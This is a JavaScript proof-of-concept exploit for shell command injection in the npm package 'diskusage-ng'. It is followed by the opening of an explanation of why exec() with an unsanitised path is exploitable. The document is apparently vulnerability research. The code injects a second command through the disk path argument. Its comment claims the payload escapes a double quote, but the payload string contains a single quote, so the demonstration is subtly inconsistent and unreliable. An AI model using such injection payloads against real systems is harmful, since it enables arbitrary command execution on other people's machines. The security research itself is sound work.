```js
const diskusage = require('diskusage-ng');
const util = require('util');

async function exploit() {
    // Promisify the callback-based API to work seamlessly with async/await
    const diskusageAsync = util.promisify(diskusage);

    // The vulnerable code constructs: exec('df -k "' + path + '"', ...)
    // The existing filter only checks for double quotes (`"`). It does not escape 
    // shell metacharacters like backslashes, backticks, or `$()`.
    // This payload escapes the trailing double quote, terminates the `df` command, 
    // executes the target binary, and comments out the remaining syntax.
    const maliciousPath = '\'; /usr/bin/genpoc #';

    // Invoking this passes the unsanitized path directly to child_process.exec,
    // which delegates it to /bin/sh -c for execution.
    await diskusageAsync(maliciousPath);
}

await exploit();
```

### Why This Demonstrates the Vulnerability

1. **Shell Context Injection**: The `exec()` method inherently spawns `/bin/sh -c "<command>"`. Any string passed to it is parsed as a shell command line, meaning all standard shell metacharacters (`;`, `\`` , `$()`, `|`, etc.) remain active unless explicitly escaped or quoted by the developer.
